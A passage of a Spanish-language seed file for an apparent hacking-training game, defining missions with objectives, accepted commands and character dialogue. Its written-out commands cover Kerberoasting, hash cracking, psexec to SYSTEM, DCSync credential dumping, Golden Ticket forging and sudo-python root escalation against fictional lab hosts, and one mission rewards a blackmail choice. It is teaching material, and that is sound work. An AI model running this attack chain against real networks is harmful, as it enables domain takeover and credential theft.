          'echo "Sé lo que haces. Hablemos. -Shadow" > /home/jmartinez/.hidden/message.txt',
          'echo "Te tengo. 50% o te delato." > /home/jmartinez/Desktop/note.txt'
        ],
        traceImpact: 25,
        category: 'ethical-choice',
        isOptional: true,
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Opción B: Chantaje. Arriesgado pero lucrativo.', mood: 'warning' },
            { character: 'SALLY', text: 'Si el Boss se entera... no será bueno para ti.', mood: 'concerned' }
          ],
          onSuccess: [
            { character: 'VIPER', text: 'Interesante movimiento. No te creía capaz.', mood: 'impressed' },
            { character: 'SALLY', text: 'Zona gris, Shadow. Cuidado con ese camino.', mood: 'worried' }
          ]
        }
      },
      
      // OBJETIVO SECRETO
      {
        code: 'DEEPER_INVESTIGATION',
        description: '[SECRETO] Investiga los contactos del traidor',
        hint: 'Revisa su historial de bash y archivos ocultos',
        commands: [
          'cat /home/jmartinez/.bash_history',
          'ls -la /home/jmartinez/.hidden/',
          'find /home/jmartinez -name "*.txt" -exec cat {} \\;'
        ],
        traceImpact: 20,
        category: 'bonus',
        isHidden: true,
        bonusXp: 150,
        tutorialDialogue: {
          onSuccess: [
            { character: 'SALLY', text: '¡Esto es grande! Martínez no trabaja solo.', mood: 'shocked' },
            { character: 'SALLY', text: 'Hay referencias a "BlackSphere" y un tal "contacto DC01"...', mood: 'analytical' },
            { character: 'BOSS', text: 'BlackSphere. Nuestro próximo objetivo.', mood: 'cold' }
          ]
        }
      }
    ],
    
    objectives: [],
    
    tracebackConfig: { 
      maxTrace: 100, 
      warningThreshold: 70,
      sessionVariables: {
        username: 'shadow',
        hostname: 'monitor-node',
        target_ip: '192.168.50.42',
        local_ip: '192.168.50.5',
        suspect_user: 'jmartinez',
        suspect_port: '8443',
        external_ip: '45.33.32.156',
        extraction_server: '10.0.0.50',
        currentDirectory: '~'
      },
      // Eventos narrativos durante la misión
      narrativeEvents: [
        {
          triggerObjective: 'CAPTURE_TRAFFIC',
          dialogue: [
            { character: 'VIPER', text: 'También estoy monitoreando esta red. No te metas en mi camino.', mood: 'threatening' }
          ]
        },
        {
          triggerObjective: 'IDENTIFY_PROCESS',
          dialogue: [
            { character: 'BOSS', text: 'Progreso. Sigue así.', mood: 'neutral' }
          ]
        }
      ],
      // Pista para la siguiente misión
      foreshadowing: {
        trigger: 'DEEPER_INVESTIGATION',
        hint: 'BlackSphere usa Active Directory. Prepárate para algo más complejo.'
      }
    },
    
    allowedCommands: [
      'cat', 'ls', 'cd', 'pwd', 'grep', 'find', 'echo',
      'ip', 'ifconfig', 'nmap',
      'tcpdump', 'netstat', 'ss', 'lsof', 'fuser',
      'strings', 'head', 'tail', 'less',
      'scp', 'rm',
      'clear', 'help'
    ],
    
    requiredNodeNumber: 3,
    
    introDialog: [
      { character: 'BOSS', text: 'Shadow Hunter. Tenemos una rata en TechCorp.', mood: 'cold' },
      { character: 'SALLY', text: 'Detectamos tráfico anómalo saliendo por el puerto 8443.', mood: 'analytical' },
      { character: 'SALLY', text: 'Alguien está vendiendo secretos corporativos. Necesitamos saber quién.', mood: 'serious' },
      { character: 'BOSS', text: 'Encuéntralo. Documéntalo. Luego... decide qué hacer con él.', mood: 'calculating' },
      { character: 'SALLY', text: 'Tienes acceso al nodo de monitoreo. Lee el informe primero.', mood: 'helpful' }
    ],
    
    // Múltiples finales según decisión ética
    outroDialogSuccess: [
      { character: 'SALLY', text: 'Misión completada. El traidor está identificado.', mood: 'satisfied' },
      { character: 'BOSS', text: 'Excelente trabajo de inteligencia.', mood: 'impressed' },
      { character: 'SALLY', text: 'Por cierto... esa referencia a BlackSphere es preocupante.', mood: 'thoughtful' },
      { character: 'BOSS', text: 'BlackSphere tiene un Domain Controller expuesto. Será tu próximo objetivo.', mood: 'cold' }
    ],
    
    outroDialogFailure: [
      { character: 'SALLY', text: 'El traidor detectó nuestra vigilancia. Huyó.', mood: 'disappointed' },
      { character: 'BOSS', text: 'Inaceptable. Teníamos la ventaja.', mood: 'furious' }
    ]
  },
});

// ═════════════════════════════════════════════════════════
// MISIÓN 5: DOMINIO OSCURO (MEJORADA - antes era M4)
// ═════════════════════════════════════════════════════════
console.log('🎯 MISIÓN 5: DOMINIO OSCURO (Active Directory) - MEJORADA');

const mission5 = await prisma.mission.create({
  data: {
    nodeNumber: 5,
    sequenceOrder: 5,
    title: 'Dominio Oscuro',
    description: 'La investigación reveló que BlackSphere opera desde un Domain Controller Windows. Es hora de comprometer todo el dominio.',
    difficulty: Difficulty.HARD,
    arc: 1,
    npcId: npcSally.id,
    briefing: 'BlackSphere usa Active Directory para controlar su infraestructura. El DC está en 10.10.10.100. Tienes credenciales iniciales de un usuario de servicio. Tu objetivo: comprometer el dominio completo y extraer todos los secretos.',
    xpReward: 900,
    creditsReward: 225,
    isPremium: false,
    estimatedTime: 30,
    tags: ['active-directory', 'windows', 'impacket', 'credential-dumping', 'epic'],
    isReplayable: true,
    minObjectives: 7,
    maxObjectives: 9,
    
    objectivesPool: [
      // ══════════════════════════════════════════════════════
      // FASE 0: PREPARACIÓN (NUEVO - EDUCATIVO)
      // ══════════════════════════════════════════════════════
      {
        code: 'UNDERSTAND_AD',
        description: 'Lee la documentación sobre Active Directory',
        hint: 'cat para leer el archivo de notas',
        commands: ['cat /home/shadow/notes/ad-basics.txt', 'cat ~/notes/ad-basics.txt', 'less ~/notes/ad-basics.txt'],
        traceImpact: 0,
        category: 'preparation',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Alto ahí, Shadow. Esto no es un servidor Linux cualquiera.', mood: 'serious' },
            { character: 'SALLY', text: 'Active Directory es el corazón de las redes Windows corporativas.', mood: 'teaching' },
            { character: 'SALLY', text: 'Lee mis notas antes de atacar. Entender AD es crucial.', mood: 'helpful' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Bien. Ahora entiendes: DC, Kerberos, LDAP, SMB. Las piezas del puzzle.', mood: 'satisfied' },
            { character: 'SALLY', text: 'Kerberos es el sistema de autenticación. Ahí está nuestra entrada.', mood: 'analytical' },
            { character: 'ZERO', text: 'El conocimiento es poder. Recuérdalo siempre.', mood: 'wise' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 1: RECONOCIMIENTO
      // ══════════════════════════════════════════════════════
      {
        code: 'VERIFY_CONNECTIVITY',
        description: 'Verifica conectividad con el Domain Controller',
        hint: 'ping básico al DC',
        commands: ['ping -c 3 10.10.10.100', 'ping -c 1 10.10.10.100', 'ping 10.10.10.100'],
        traceImpact: 3,
        category: 'recon',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Primero, confirma que el DC está vivo.', mood: 'focused' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'DC01 respondiendo. Windows Server activo.', mood: 'success' },
            { character: 'VIPER', text: 'También estoy aquí, novato. Que empiece la carrera.', mood: 'mocking' }
          ]
        }
      },
      {
        code: 'SCAN_DC_PORTS',
        description: 'Escanea puertos del DC para identificar servicios',
        hint: 'nmap con detección de servicios',
        commands: [
          'nmap -sV 10.10.10.100',
          'nmap -sC -sV 10.10.10.100',
          'nmap -p 88,135,139,389,445,636,3268,3269 10.10.10.100'
        ],
        traceImpact: 12,
        category: 'scanning',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Escanea los puertos típicos de AD:', mood: 'teaching' },
            { character: 'SALLY', text: '88=Kerberos, 389=LDAP, 445=SMB, 636=LDAPS', mood: 'analytical' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '¡Confirmado! Kerberos, LDAP, SMB activos. Es un DC legítimo.', mood: 'excited' },
            { character: 'SALLY', text: 'Windows Server 2019. Dominio: blacksphere.local', mood: 'success' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 2: ENUMERACIÓN CON CREDENCIALES
      // ══════════════════════════════════════════════════════
      {
        code: 'TEST_CREDENTIALS',
        description: 'Verifica que las credenciales iniciales funcionan',
        hint: 'crackmapexec smb para validar credenciales',
        commands: [
          'crackmapexec smb 10.10.10.100 -u svc_backup -p Backup2024!',
          'cme smb 10.10.10.100 -u svc_backup -p Backup2024!'
        ],
        traceImpact: 8,
        category: 'validation',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Las credenciales de svc_backup vienen de la misión anterior.', mood: 'analytical' },
            { character: 'SALLY', text: 'crackmapexec (cme) es tu navaja suiza para AD.', mood: 'teaching' },
            { character: 'SALLY', text: 'Si ves [+] significa acceso válido.', mood: 'helpful' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '¡Credenciales válidas! svc_backup tiene acceso al dominio.', mood: 'triumphant' },
            { character: 'BOSS', text: 'Primer paso completado. Continúa.', mood: 'neutral' }
          ]
        }
      },
      {
        code: 'ENUMERATE_SMB_SHARES',
        description: 'Enumera los shares SMB disponibles',
        hint: 'crackmapexec con --shares',
        commands: [
          'crackmapexec smb 10.10.10.100 -u svc_backup -p Backup2024! --shares',
          'smbclient -L //10.10.10.100 -U svc_backup%Backup2024!',
          'smbmap -H 10.10.10.100 -u svc_backup -p Backup2024!'
        ],
        traceImpact: 10,
        category: 'enumeration',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Los shares SMB pueden contener información sensible.', mood: 'teaching' },
            { character: 'SALLY', text: 'SYSVOL y NETLOGON son estándar en DCs. Busca shares custom.', mood: 'analytical' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Shares: ADMIN$, C$, IPC$, SYSVOL, NETLOGON, Backup_Data', mood: 'success' },
            { character: 'SALLY', text: 'Backup_Data accesible. Podría tener información jugosa.', mood: 'interested' }
          ]
        }
      },
      {
        code: 'ENUMERATE_DOMAIN_USERS',
        description: 'Enumera todos los usuarios del dominio',
        hint: 'impacket-GetADUsers para listar usuarios',
        commands: [
          'impacket-GetADUsers -all blacksphere.local/svc_backup:Backup2024! -dc-ip 10.10.10.100',
          'impacket-GetADUsers blacksphere.local/svc_backup:Backup2024! -dc-ip 10.10.10.100 -all',
          'crackmapexec ldap 10.10.10.100 -u svc_backup -p Backup2024! --users'
        ],
        traceImpact: 15,
        category: 'enumeration',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'Impacket es la suite definitiva para atacar AD desde Linux.', mood: 'teaching' },
            { character: 'SALLY', text: 'GetADUsers extrae todos los usuarios del directorio.', mood: 'analytical' },
            { character: 'SALLY', text: 'Busca cuentas de servicio y administradores.', mood: 'focused' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Usuarios extraídos: Administrator, BS-Admin, svc_backup, svc_sql...', mood: 'success' },
            { character: 'SALLY', text: '¡BS-Admin es Domain Admin! Ese es nuestro objetivo final.', mood: 'excited' },
            { character: 'VIPER', text: 'Ya vi a BS-Admin. Estoy un paso adelante.', mood: 'mocking' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 3: ATAQUE KERBEROS (KERBEROASTING)
      // ══════════════════════════════════════════════════════
      {
        code: 'KERBEROAST_ATTACK',
        description: 'Ejecuta ataque Kerberoasting para extraer hashes',
        hint: 'impacket-GetUserSPNs con -request',
        commands: [
          'impacket-GetUserSPNs blacksphere.local/svc_backup:Backup2024! -dc-ip 10.10.10.100 -request',
          'impacket-GetUserSPNs -request -dc-ip 10.10.10.100 blacksphere.local/svc_backup:Backup2024!',
          'impacket-GetUserSPNs blacksphere.local/svc_backup:Backup2024! -dc-ip 10.10.10.100 -request -outputfile hashes.txt'
        ],
        traceImpact: 18,
        category: 'attack',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: '🔥 KERBEROASTING - El ataque estrella contra AD.', mood: 'excited' },
            { character: 'SALLY', text: 'Funciona así: pedimos tickets Kerberos para cuentas con SPN.', mood: 'teaching' },
            { character: 'SALLY', text: 'Esos tickets están cifrados con el hash del password. Crackeable offline.', mood: 'analytical' },
            { character: 'SALLY', text: 'Lo mejor: es tráfico legítimo. El DC no sospecha nada.', mood: 'mischievous' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '¡HASH CAPTURADO! svc_sql tiene SPN y su ticket es nuestro.', mood: 'triumphant' },
            { character: 'SALLY', text: '$krb5tgs$23$*svc_sql$BLACKSPHERE.LOCAL$... Hash listo para crackear.', mood: 'success' },
            { character: 'BOSS', text: 'Impresionante. El DC no detectó nada.', mood: 'impressed' }
          ]
        }
      },
      {
        code: 'CRACK_KERBEROS_HASH',
        description: 'Crackea el hash Kerberos offline',
        hint: 'hashcat -m 13100 para TGS-REP',
        commands: [
          'hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt',
          'hashcat -m 13100 -a 0 hashes.txt rockyou.txt',
          'john --wordlist=/usr/share/wordlists/rockyou.txt hashes.txt',
          'john hashes.txt --format=krb5tgs'
        ],
        traceImpact: 0,
        category: 'cracking',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: '💻 Cracking OFFLINE - Esto no genera tráfico de red.', mood: 'teaching' },
            { character: 'SALLY', text: 'hashcat -m 13100 es para hashes TGS-REP (Kerberoasting).', mood: 'analytical' },
            { character: 'SALLY', text: 'rockyou.txt tiene 14 millones de passwords comunes.', mood: 'neutral' },
            { character: 'SALLY', text: 'Si el sysadmin usó un password débil... lo tenemos.', mood: 'hopeful' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '🎯 ¡CRACKEADO! Password de svc_sql: SqlServer2024!', mood: 'triumphant' },
            { character: 'SALLY', text: 'Típico. Los admins siempre usan passwords predecibles.', mood: 'mocking' },
            { character: 'VIPER', text: 'También lo crackeé. ¿Ahora qué, novato?', mood: 'competitive' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 4: MOVIMIENTO LATERAL
      // ══════════════════════════════════════════════════════
      {
        code: 'PSEXEC_DC',
        description: 'Obtén shell de SYSTEM en el DC usando PsExec',
        hint: 'impacket-psexec con credenciales de admin',
        commands: [
          'impacket-psexec blacksphere.local/BS-Admin:Admin2024!@10.10.10.100',
          'impacket-psexec BS-Admin:Admin2024!@10.10.10.100',
          'impacket-wmiexec blacksphere.local/BS-Admin:Admin2024!@10.10.10.100',
          'impacket-smbexec blacksphere.local/BS-Admin:Admin2024!@10.10.10.100'
        ],
        traceImpact: 35,
        category: 'lateral-movement',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: '⚠️ ALERTA: PsExec genera eventos detectables.', mood: 'warning' },
            { character: 'SALLY', text: 'Evento 4624 (logon) y 7045 (servicio) quedarán en logs.', mood: 'serious' },
            { character: 'SALLY', text: 'Pero si BS-Admin tiene permisos... tendremos shell SYSTEM.', mood: 'hopeful' },
            { character: 'BOSS', text: 'Hazlo. El riesgo vale la recompensa.', mood: 'cold' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '🔥 ¡SHELL SYSTEM EN DC01! Eres Dios de este dominio.', mood: 'triumphant' },
            { character: 'SALLY', text: 'Microsoft Windows [Version 10.0.17763.2366]', mood: 'excited' },
            { character: 'SALLY', text: 'C:\\Windows\\system32> ... Acceso total.', mood: 'impressed' },
            { character: 'BOSS', text: 'Excelente. Ahora extrae todo.', mood: 'satisfied' },
            { character: 'VIPER', text: '¡Maldición! Llegaste primero al DC.', mood: 'angry' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 5: EXTRACCIÓN DE SECRETOS
      // ══════════════════════════════════════════════════════
      {
        code: 'DUMP_ALL_SECRETS',
        description: 'Extrae NTDS.dit - todos los hashes del dominio',
        hint: 'impacket-secretsdump para DCSync',
        commands: [
          'impacket-secretsdump blacksphere.local/BS-Admin:Admin2024!@10.10.10.100',
          'impacket-secretsdump -just-dc blacksphere.local/BS-Admin:Admin2024!@10.10.10.100',
          'impacket-secretsdump -just-dc-ntlm blacksphere.local/BS-Admin:Admin2024!@10.10.10.100'
        ],
        traceImpact: 45,
        category: 'credential-dumping',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: '💀 SECRETSDUMP - El golpe final.', mood: 'serious' },
            { character: 'SALLY', text: 'Esto ejecuta DCSync: simula ser un DC y pide replicación.', mood: 'teaching' },
            { character: 'SALLY', text: 'Obtendremos NTDS.dit: TODOS los hashes de TODOS los usuarios.', mood: 'excited' },
            { character: 'SALLY', text: 'Administrador, usuarios VIP, cuentas de servicio... TODO.', mood: 'triumphant' },
            { character: 'BOSS', text: 'Esto vale millones. Procede.', mood: 'calculating' }
          ],
          onSuccess: [
            { character: 'SALLY', text: '🏆 ¡NTDS.DIT EXTRAÍDO! Dominio completamente comprometido.', mood: 'triumphant' },
            { character: 'SALLY', text: 'Administrator:500:aad3b435b51404eeaad3b435b51404ee:...', mood: 'success' },
            { character: 'SALLY', text: 'Hashes de 847 usuarios capturados.', mood: 'impressed' },
            { character: 'BOSS', text: '847 usuarios. 847 llaves a todo el reino. Impresionante.', mood: 'very_impressed' },
            { character: 'VIPER', text: 'Bien jugado, Shadow. Esta vez ganaste.', mood: 'respectful_defeat' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // OBJETIVOS OPCIONALES Y SECRETOS
      // ══════════════════════════════════════════════════════
      {
        code: 'BLOODHOUND_MAPPING',
        description: '[OPCIONAL] Mapea el dominio completo con BloodHound',
        hint: 'bloodhound-python -c All',
        commands: [
          'bloodhound-python -u svc_backup -p Backup2024! -d blacksphere.local -dc DC01.blacksphere.local -c All',
          'bloodhound-python -c All -u svc_backup -p Backup2024! -d blacksphere.local -ns 10.10.10.100'
        ],
        traceImpact: 20,
        category: 'recon',
        isOptional: true,
        bonusXp: 100,
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'BloodHound mapea TODAS las relaciones del AD.', mood: 'teaching' },
            { character: 'SALLY', text: 'Encuentra caminos de ataque que nunca verías manualmente.', mood: 'analytical' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'Data de BloodHound recolectada. 4 archivos JSON generados.', mood: 'success' },
            { character: 'SALLY', text: 'Esto revelaría caminos alternativos a Domain Admin.', mood: 'satisfied' }
          ]
        }
      },
      {
        code: 'GOLDEN_TICKET_PREP',
        description: '[SECRETO] Prepara un Golden Ticket para persistencia',
        hint: 'Necesitas el hash de krbtgt',
        commands: [
          'impacket-secretsdump -just-dc-user krbtgt blacksphere.local/BS-Admin:Admin2024!@10.10.10.100',
          'impacket-ticketer -nthash <KRBTGT_HASH> -domain-sid S-1-5-21-... -domain blacksphere.local Administrator'
        ],
        traceImpact: 50,
        category: 'persistence',
        isHidden: true,
        bonusXp: 200,
        tutorialDialogue: {
          onSuccess: [
            { character: 'SALLY', text: '🎫 ¡Golden Ticket preparado! Acceso PERMANENTE al dominio.', mood: 'amazed' },
            { character: 'BOSS', text: 'Conoces técnicas avanzadas. Interesante.', mood: 'impressed' },
            { character: 'ZERO', text: 'El Golden Ticket es la llave maestra definitiva.', mood: 'respectful' }
          ]
        }
      }
    ],
    
    objectives: [],
    
    tracebackConfig: { 
      maxTrace: 100, 
      warningThreshold: 75,
      sessionVariables: {
        username: 'shadow',
        hostname: 'kali',
        target_dc: '10.10.10.100',
        target_ip: '10.10.10.100',
        domain: 'blacksphere.local',
        dc_hostname: 'DC01',
        initial_user: 'svc_backup',
        initial_pass: 'Backup2024!',
        admin_user: 'BS-Admin',
        admin_pass: 'Admin2024!',
        sql_user: 'svc_sql',
        sql_pass: 'SqlServer2024!',
        local_ip: '10.10.10.50',
        currentDirectory: '~'
      },
      // Eventos de detección con probabilidad
      detectionEvents: [
        {
          id: 'KERB_AUDIT',
          probability: 0.15,
          triggerObjective: 'KERBEROAST_ATTACK',
          dialogue: [
            { character: 'SALLY', text: '⚡ Evento 4769 generado. Solicitud de ticket TGS.', mood: 'alert' },
            { character: 'SALLY', text: 'Tráfico legítimo... por ahora no levanta sospechas.', mood: 'relieved' }
          ],
          traceIncrease: 5
        },
        {
          id: 'PSEXEC_ALERT',
          probability: 0.35,
          triggerObjective: 'PSEXEC_DC',
          dialogue: [
            { character: 'SALLY', text: '🚨 ¡ALERTA! Evento 4624 - Logon desde IP externa.', mood: 'panicked' },
            { character: 'SALLY', text: 'El SOC podría investigar. Muévete RÁPIDO.', mood: 'urgent' }
          ],
          traceIncrease: 15
        },
        {
          id: 'DCSYNC_CRITICAL',
          probability: 0.50,
          triggerObjective: 'DUMP_ALL_SECRETS',
          dialogue: [
            { character: 'SALLY', text: '🔴 CRÍTICO: Replicación de directorio detectada.', mood: 'panicked' },
            { character: 'SALLY', text: 'Evento 4662 - Acceso a objeto AD sensible.', mood: 'alert' },
            { character: 'BOSS', text: 'Ya tenemos lo que necesitamos. Sal de ahí.', mood: 'cold' }
          ],
          traceIncrease: 25
        }
      ],
      // Narrativa dinámica durante la misión
      narrativeEvents: [
        {
          triggerObjective: 'ENUMERATE_DOMAIN_USERS',
          dialogue: [
            { character: 'VIPER', text: 'También estoy enumerando. ¿Crees que puedes ganarme?', mood: 'mocking' }
          ]
        },
        {
          triggerObjective: 'CRACK_KERBEROS_HASH',
          dialogue: [
            { character: 'ZERO', text: 'El cracking offline es indetectable. Paciencia es virtud.', mood: 'wise' }
          ]
        },
        {
          triggerObjective: 'PSEXEC_DC',
          dialogue: [
            { character: 'VIPER', text: '¡NO! ¿Cómo conseguiste credenciales de BS-Admin?', mood: 'shocked' },
            { character: 'BOSS', text: 'Parece que subestimé a Shadow Hunter.', mood: 'impressed' }
          ]
        }
      ]
    },
    
    allowedCommands: [
      // Básicos
      'cat', 'ls', 'cd', 'pwd', 'grep', 'head', 'tail', 'less', 'echo',
      // Red básico
      'ping', 'nmap', 'dig', 'nslookup', 'host',
      // SMB
      'smbclient', 'smbmap', 'rpcclient', 'enum4linux',
      // Impacket suite
      'impacket-psexec', 'impacket-wmiexec', 'impacket-smbexec',
      'impacket-secretsdump', 'impacket-GetUserSPNs', 'impacket-GetADUsers',
      'impacket-ticketer', 'impacket-lookupsid', 'impacket-GetNPUsers',
      // CrackMapExec
      'crackmapexec', 'cme',
      // LDAP
      'ldapsearch', 'ldapdomaindump',
      // BloodHound
      'bloodhound-python',
      // Cracking
      'hashcat', 'john',
      // Kerberos
      'kinit', 'klist', 'kdestroy',
      // Utilidades
      'nc', 'curl', 'wget', 'scp', 'awk', 'cut', 'export',
      // Evil-WinRM
      'evil-winrm',
      // Sistema
      'clear', 'help'
    ],
    
    requiredNodeNumber: 4,
    
    introDialog: [
      { character: 'BOSS', text: 'Shadow Hunter. La investigación del traidor reveló algo grande.', mood: 'serious' },
      { character: 'SALLY', text: 'BlackSphere opera desde un Domain Controller Windows.', mood: 'analytical' },
      { character: 'SALLY', text: 'IP: 10.10.10.100, Dominio: blacksphere.local', mood: 'focused' },
      { character: 'SALLY', text: 'Tienes credenciales iniciales: svc_backup / Backup2024!', mood: 'helpful' },
      { character: 'SALLY', text: 'Son de un usuario de servicio. Acceso limitado, pero es nuestra entrada.', mood: 'analytical' },
      { character: 'BOSS', text: 'Quiero el NTDS.dit. Todos los hashes. Todo el dominio.', mood: 'demanding' },
      { character: 'BOSS', text: 'Esto determinará si estás listo para misiones de élite.', mood: 'cold' },
      { character: 'VIPER', text: 'También tengo esas credenciales. Veamos quién compromete el dominio primero.', mood: 'competitive' }
    ],
    
    outroDialogSuccess: [
      { character: 'SALLY', text: '🏆 ¡MISIÓN COMPLETADA! BlackSphere está completamente comprometido.', mood: 'triumphant' },
      { character: 'SALLY', text: 'NTDS.dit extraído. 847 hashes de usuario capturados.', mood: 'impressed' },
      { character: 'BOSS', text: 'Impresionante. Has demostrado habilidades de nivel avanzado.', mood: 'very_impressed' },
      { character: 'VIPER', text: 'Bien jugado. No esperaba que llegaras tan lejos.', mood: 'respectful' },
      { character: 'ZERO', text: 'Shadow Hunter, has madurado. Pero el próximo desafío será personal.', mood: 'ominous' },
      { character: 'BOSS', text: 'Prepárate. Tu siguiente misión involucra a alguien que conoces bien...', mood: 'mysterious' }
    ],
    
    outroDialogFailure: [
      { character: 'SALLY', text: 'El SOC de BlackSphere detectó la intrusión.', mood: 'disappointed' },
      { character: 'SALLY', text: 'Aislaron el DC y cambiaron todas las credenciales.', mood: 'defeated' },
      { character: 'VIPER', text: 'Jajaja. Demasiado ruidoso, novato.', mood: 'mocking' },
      { character: 'BOSS', text: 'Inaceptable. Esperaba más de ti.', mood: 'furious' }
    ]
  },
});

// ═════════════════════════════════════════════════════════
// MISIÓN 6: EL PUNTO DE QUIEBRE (antes era M5)
// ═════════════════════════════════════════════════════════
console.log('🎯 MISIÓN 6: EL PUNTO DE QUIEBRE (Boss Fight)');

const mission6 = await prisma.mission.create({
  data: {
    nodeNumber: 6,
    sequenceOrder: 6,
    title: 'El Punto de Quiebre',
    description: 'VIPER te desafía directamente. Un servidor, dos hackers. Solo uno llegará a root.',
    difficulty: Difficulty.EXPERT,
    arc: 1,
    npcId: npcBoss.id,
    briefing: 'VIPER ha estado siguiendo tus pasos. Ahora quiere demostrar que es mejor que tú. Un servidor Linux, mismo punto de partida. El primero en obtener root gana. Tu reputación está en juego.',
    xpReward: 1200,
    creditsReward: 300,
    isPremium: false,
    estimatedTime: 25,
    tags: ['boss-fight', 'privilege-escalation', 'competition', 'pvp', 'finale'],
    isReplayable: true,
    minObjectives: 5,
    maxObjectives: 8,
    
    objectivesPool: [
      // ══════════════════════════════════════════════════════
      // FASE 1: RECONOCIMIENTO INICIAL
      // ══════════════════════════════════════════════════════
      {
        code: 'CHECK_IDENTITY',
        description: 'Verifica tu identidad y permisos actuales',
        hint: 'whoami e id',
        commands: ['whoami', 'id'],
        traceImpact: 2,
        category: 'recon',
        tutorialDialogue: {
          intro: [
            { character: 'VIPER', text: 'El reloj corre, novato. ¿Vas a quedarte ahí?', mood: 'mocking' }
          ],
          onSuccess: [
            { character: 'ZERO', text: 'Usuario shadow, grupo users. Sin privilegios especiales.', mood: 'neutral' },
            { character: 'VIPER', text: 'Ya sé eso. ¿Algo más lento?', mood: 'impatient' }
          ]
        }
      },
      {
        code: 'CHECK_SUDO_PERMISSIONS',
        description: 'Verifica qué comandos puedes ejecutar con sudo',
        hint: 'sudo -l muestra permisos sudo',
        commands: ['sudo -l'],
        traceImpact: 8,
        category: 'enumeration',
        tutorialDialogue: {
          intro: [
            { character: 'ZERO', text: 'sudo -l es tu primer movimiento en cualquier privesc Linux.', mood: 'teaching' }
          ],
          onSuccess: [
            { character: 'ZERO', text: '¡Interesante! Python con NOPASSWD. Esa es tu entrada.', mood: 'excited' },
            { character: 'VIPER', text: 'También lo vi. La carrera está reñida.', mood: 'competitive' },
            { character: 'SALLY', text: 'Python con sudo... clásico vector de escalación.', mood: 'analytical' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 2: ENUMERACIÓN AVANZADA
      // ══════════════════════════════════════════════════════
      {
        code: 'FIND_SUID_BINARIES',
        description: 'Busca binarios con bit SUID activado',
        hint: 'find / -perm -4000 para SUID',
        commands: [
          'find / -perm -4000 2>/dev/null',
          'find / -perm -u=s 2>/dev/null',
          'find / -perm -4000 -type f 2>/dev/null'
        ],
        traceImpact: 12,
        category: 'enumeration',
        tutorialDialogue: {
          intro: [
            { character: 'SALLY', text: 'SUID permite ejecutar como el dueño del archivo.', mood: 'teaching' },
            { character: 'SALLY', text: 'Si un binario root tiene SUID y es explotable... root instantáneo.', mood: 'analytical' }
          ],
          onSuccess: [
            { character: 'SALLY', text: 'SUID encontrados: /usr/bin/python3.8, /usr/bin/find...', mood: 'success' },
            { character: 'ZERO', text: 'Python con SUID. Múltiples vectores disponibles.', mood: 'satisfied' },
            { character: 'VIPER', text: 'Ja. Ya enumeré eso hace 30 segundos.', mood: 'mocking' }
          ]
        }
      },
      {
        code: 'CHECK_CRON_JOBS',
        description: 'Revisa tareas programadas que podrían ser explotables',
        hint: 'cat /etc/crontab y ls /etc/cron.*',
        commands: [
          'cat /etc/crontab',
          'ls -la /etc/cron.d/',
          'ls -la /etc/cron.daily/',
          'crontab -l'
        ],
        traceImpact: 6,
        category: 'enumeration',
        isOptional: true,
        tutorialDialogue: {
          onSuccess: [
            { character: 'SALLY', text: 'Cron job ejecutando /opt/backup.sh como root cada 5 min.', mood: 'alert' },
            { character: 'SALLY', text: 'Si puedes modificar ese script... otra vía a root.', mood: 'analytical' }
          ]
        }
      },
      
      // ══════════════════════════════════════════════════════
      // FASE 3: EXPLOTACIÓN
      // ══════════════════════════════════════════════════════
      {
        code: 'EXPLOIT_SUDO_PYTHON',
        description: 'Explota sudo python para obtener shell root',
        hint: 'sudo python -c "import os; os.system(\'/bin/bash\')"',
        commands: [
          'sudo python -c "import os; os.system(\'/bin/bash\')"',
          'sudo python3 -c "import os; os.system(\'/bin/bash\')"',
          'sudo /usr/bin/python -c "import os; os.system(\'/bin/bash\')"',
          'sudo /usr/bin/python3 -c "import os; os.execl(\'/bin/bash\', \'bash\')"'
        ],
        traceImpact: 25,
        category: 'exploitation',
        tutorialDialogue: {
          intro: [
            { character: 'ZERO', text: 'Python puede spawnearte una shell con privilegios de sudo.', mood: 'teaching' },
            { character: 'ZERO', text: 'os.system() ejecuta comandos. Si sudo te da python...', mood: 'analytical' },
            { character: 'VIPER', text: '¡Vamos! ¿Quién llega primero?', mood: 'excited' }
          ],
          onSuccess: [
            { character: 'ZERO', text: '🔥 ¡ROOT OBTENIDO! Shell de superusuario activa.', mood: 'triumphant' },
            { character: 'SALLY', text: '¡Lo lograste antes que VIPER!', mood: 'excited' },
            { character: 'VIPER', text: '¡MALDICIÓN! Estaba a segundos...', mood: 'furious' },
            { character: 'BOSS', text: 'Impresionante velocidad.', mood: 'impressed' }
          ]
        }
      },
      {
        code: 'VERIFY_ROOT_ACCESS',
        description: 'Confirma que tienes acceso root',
        hint: 'whoami debe mostrar "root"',
        commands: ['whoami', 'id'],
        traceImpact: 0,
        category: 'verification',
